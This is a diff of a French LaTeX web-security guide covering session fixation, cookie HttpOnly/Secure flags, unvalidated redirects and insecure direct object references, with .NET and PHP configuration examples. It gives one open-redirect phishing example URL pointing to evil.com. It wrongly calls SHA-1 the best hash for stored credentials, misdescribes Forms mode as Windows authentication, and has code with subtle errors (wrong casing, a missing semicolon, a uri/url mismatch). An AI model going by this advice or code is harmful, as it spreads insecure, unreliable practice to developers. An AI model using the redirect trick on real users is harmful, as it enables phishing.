+Pour se protéger de ce type d'attaque, il est recommandé d'utiliser un index de tous les SIDs actifs. Cette protection permet d'éviter l'utilisation de SID forgé par l'attaquant et évite que celui-ci injecte ses propres SID dans les données du site. \\
+En ce cas l'attaquant peut utiliser un SID qu'il aura généré en se connectant lui-même au site. Une fois, la victime injectée, le serveur ne pourra pas facilement identifier un utilisateur injecté d'un autre, cette attaque s'appelle une \textbf{fixation de session}. Il est alors possible d'utiliser l'adresse IP de l'utilisateur pour déterminer si les données de session reste cohérente.\\
+
+Cependant ce type d'information s'oppose à la création de session longue durée pour les terminaux mobiles qui peuvent utiliser de multiples points d'accès.
+\subsubsection{Fixation de SID}
+\begin{Define}{Vulnérabilités!SID (Fixation)}
+Une fixation de session consiste en la capacité par l'attaquant d'exploiter le mécanisme du site pour fournir à la victime un SID statique de son choix. Il s'agit d'un type particulier d'injection de SID.
+\end{Define}
+Afin d'éviter les attaques par fixation de session, il est nécessaire de changer le SID après la connexion d'un utilisateur. En effet, si le SID reste constant, l'utilisateur peut utiliser sans le savoir le SID d'un attaquant. 
+\begin{Config}{csharp}{.NET: Protection contre la fixation de session}
+//pre_login.cs
+Session.Abandon();
+Response.Redirect("login.aspx");
+
+//login.aspx
+@if(Session.isNewSession()==false)
+	throw new ApplicationException("Session Fixation Attack")
+\end{Config}
+
+
+\subsubsection{Vol de session}
+\begin{Define}{SID}
+Le plus couramment un \gls{SID} est stocké dans un cookie de session. Ce cookie de session est donc la seule information permettant de relier un utilisateur à sa session. Il devient donc critique à protéger
+\end{Define}
+\begin{Warning}
+Afin de protéger le cookie de session contre d'éventuels vols de données, celui-ci doit être paramétré avec les flags \textit{HttpOnly}  et \textit{Secure}. Ces options permettent respectivement de rendre le cookie inaccessible au XSS et impossible à échanger en connexion HTTP. 
+\end{Warning}
+\begin{Stop}
+Le flag \textit{Secure} n'est approprié que pour les sites supportant HTTPS. Il est impossible à configurer sur un site en HTTP seulement. En revanche, \textit{HttpOnly} peut être utilisé en HTTP et en HTTPS.
+\end{Stop}
+
+Par défaut en .NET, les cookies de session sont automatiquement configuré en \textit{HttpOnly}. Cependant, le flag \textit{Secure} n'est pas automatiquement activé et doit être configuré dans le fichier \textit{web.config}. De plus, en cas d'utilisation de cookie de session ne reposant pas sur le cookie \textbf{ASP.NET\_SessionId}, la configuration en \textit{HttpOnly} peut être configuré à l'échelle globale ou à la création du cookie.
+\begin{Config}{csharp}{.NET: Création d'un cookie sécurisé}
+HttpCookie MyCookie = new HttpCookie("SuperSecret");
+MyCookie.Value = "No Security through Obscurity";
+MyCookie.Expires = now.AddHours(1);
+MyCookie.HttpOnly = true; // Secure Cookie against JS Injection
+MyCookie.Secure = true; // Secure Cookie against HTTP Interception
+Response.Cookies.Add(MyCookie);
+\end{Config}
+\MarginPar{\textbf{.NET}: Protection des cookies}{0cm}
+\begin{Config}{XML}{web.config: Configuration des cookies de sessions et configuration générale}
+<system.web>
+	<httpCookies httpOnlyCookies="true" requireSSL="true" />
+	<sessionState
+		cookieless="false"
+		regenerateExpiredSessionId="true"
+		timeout="30"
+	/>
+</system.web>
+\end{Config}
+
+En PHP, les flags \textit{Secure} et \textit{HttpOnly} ne sont pas activé par défaut, il est alors recommandé de les activer si le cookie \textbf{PHPSESSID} est utilisé.
+\begin{Config}{ini}{php.ini: Configuration des cookies de sessions et configuration générale}
+[PHP]
+; ...
+session.cookie_secure = 1 
+session.cookie_httponly = 1 
+; Non géré par défaut 
+session.use_strict_mode = 1
+; Par défaut cette option est à 0, cependant sa configuration à 1 empêche l'injection de SID forgé
+session.use_cookies = 1
+session.use_only_cookies = 1
+;Par défaut
+; ...
+\end{Config}
+
+
+\subsection{URL: Direct Access Reference et Unvalidated Redirection}
+\subsubsection{Unvalidated Redirection}
+\begin{Define}{Vulnérabilités!Unvalidated Redirection}
+Une \textit{Unvalidated Redirection} est une attaque consistant à utiliser un mécanisme de redirection du site en modifiant l'adresse cible via une entrée utilisateur. Ce type d'attaque peut permettre de conduire des campagnes de phishing. En effet, la redirection est transparente pour l'utilisateur et celui-ci peut croire être sur un site légitime, là où l'attaquant l'a redirigé vers une copie. De plus, dans certains cas, des informations peuvent être transmises lors de la redirection comme les identifiants ou mot de passe.
+\end{Define}
+
+Les attaques de ce type exploitent en général les URLs du type \url{http://example.com/login?ReturnURL=/Admin} en substituant le \textit{/Admin} par l'adresse choisie par l'attaquant. Par exemple, l'attaquant pourra envoyer l'adresse suivante à l'utilisateur: \url{http://example.com/login?ReturnURL=http://evil.com/login} avec une interface imitant l'interface de login.
+
+Différentes mesures existent pour se prémunir de ce type d'attaque de la même manière que contre les \gls{LFI}s ou les \gls{RFI}s. Par exemple si l'adresse est relative, le code peut vérifier qu'elle le reste:
+\begin{Config}{csharp}{.NET: Vérification d'URI relative}
+var uri= Request.QueryString["Uri"];
+if (!Uri.IsWellFormedUriString(uri,UriKind.Relative)){
+	throw new ApplicationException("URI not allowed");
+}
+\end{Config}
+
+Si le processus nécessite de rediriger vers une page externe, le code peut vérifier que celle-ci appartient bien à une liste blanche en utilisant la classe \textbf{DbContext}.
+\begin{Config}{csharp}{.NET: Vérification par liste blanche}
+//var db = new DbContext();
+// [...]
+var uri= Request.QueryString["Uri"];
+if (!db.WhiteListURLs.Where(u => u.URL == url).Any()){
+	throw new ApplicationException("Redirection not allowed");
+}
+\end{Config}
+
+Enfin une notification peut être affichée à l'utilisateur en cas de sortie du site.
+
+
+\subsubsection{Direct Object Reference}
+\begin{Define}{Vulnérabilités!Direct Object Reference}
+Une attaque par \textit{Insecure Direct Object Reference} consiste en un accès direct à une ressource ou une fonction du serveur sans restriction de contrôle d'accès, c'est-à-dire qu'un utilisateur disposant de droits insuffisants et/ou anonyme pourrait être en mesure d'accéder à des fonctions privilégiées par la seule connaissance de l'adresse direct de la fonction.
+\end{Define}
+Ce type de vulnérabilité se retrouve fréquemment sur les sites Web avec l'accès à des fonctions d'APIs permettant d'ajouter des utilisateurs ou de les énumérer simplement en faisant varier des paramètres ou en devinant une URL prédictible du type "/AddUser.php".\\
+Les protections contre ce type de vulnérabilité repose sur un meilleur contrôle d'accès des utilisateurs.\\
+
+En .NET, pour éviter l'accès à des zones non-autorisée, il est possible de contrôler les utilisateurs par rôles, nom ou type avec IIS. L'authentification est à différencier de la gestion par session. En effet le cookie de session ne contient que la session, tandis que le cookie d'authentification contient plus d'informations comme les informations de groupes auquel appartient le user. Il est recommandé de protéger ce cookie par l'utilisation du flag \textbf{protection} qui chiffre le cookie.
+\begin{Config}{XML}{web.config: Authentication et Authorization}
+  <authentication mode="Forms">
+    <forms loginUrl="Login.aspx"
+           protection="All" timeout="30"  name=".ASPXAUTH" path="/"
+           requireSSL="true" slidingExpiration="true" defaultUrl="default.aspx"
+           cookieless="false" enableCrossAppRedirects="false" />
+  </authentication>
+  <roleManager 
+   defaultProvider="SQL"enabled="true" 
+   cacheRolesInCookie="true" >
+ </roleManager>
+  <authorization>
+    <deny users="?" />
+  </authorization>
+  
+  <credentials passwordFormat="SHA1" >
+    <user name="Mercure"
+          password="07B7F3EE06F278DB966BE960E7CBBD103DF30CA6"/>
+  </credentials>
+\end{Config}
+Cette configuration permet d'utiliser un ticket protégé et chiffré au sein d'un cookie de session permettant d'associer un utilisateur à son profil. En outre, il permet également de gérer les autorisations de manière plus fine. Il est à noter que pour les identifiants stockés dans le fichier de configuration, SHA-1 est la meilleure méthode cryptographique de hachage. Avec \payloadhtml{<authentication mode="Forms" />}, il est possible d'utiliser les mécanismes d'authentification de Windows.\\
+En utilisant l'autentification de type \textit{Forms}, la page de login doit être configuré pour intégrer l'authentification Forms.
+\begin{Config}{csharp}{.NET: Code de script dans la page d'authentification}
+    void SubmitBtn_Click(Object Source, EventArgs e)
+    {
+        // Try to authenticate credentials supplied by user.
+        if (FormsAuthentication.Authenticate(UserName.Value, 
+                UserPassword.Value))
+        {
+            FormsAuthenticationTicket ticket = new 
+                FormsAuthenticationTicket(UserName.Value, false, 5000);
+                  
+            FormsAuthentication.RedirectFromLoginPage(UserName.Value,
+                Persist.Checked);
+        }
+    }
+\end{Config}
+
+Dans le cas d'un besoin d'intégration au sein d'une application legacy, le code suivant peut être utilisé:
+\begin{Config}{csharp}{.NET: Gestion des Forms Ticket dans un contexte legacy}
+FormsAuthenticationTicket tkt = 
+      new FormsAuthenticationTicket(1, username, 
+        DateTime.Now, DateTime.Now.AddMinutes(30), 
+        chkPersistCookie.Checked, "");
+HttpCookie ck = 
+      new HttpCookie(FormsAuthentication.FormsCookieName, FormsAuthentication.Encrypt(tkt));
+\end{Config}
+
